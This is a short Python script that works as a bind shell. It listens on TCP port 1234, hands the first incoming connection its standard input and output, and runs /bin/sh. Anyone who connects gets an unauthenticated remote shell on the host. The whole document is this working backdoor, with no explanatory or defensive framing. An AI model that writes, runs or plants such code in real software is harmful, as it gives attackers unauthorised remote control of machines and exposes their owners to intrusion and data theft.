import sys, socket, subprocess, os

port = 1234

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.bind(('', port))
sock.listen(1)

conn, addr = sock.accept()

os.dup2(conn.fileno(), 0)
os.dup2(conn.fileno(), 1)
os.dup2(conn.fileno(), 2)
os.execl( "/bin/sh", "sh" );

conn.close()
sock.close()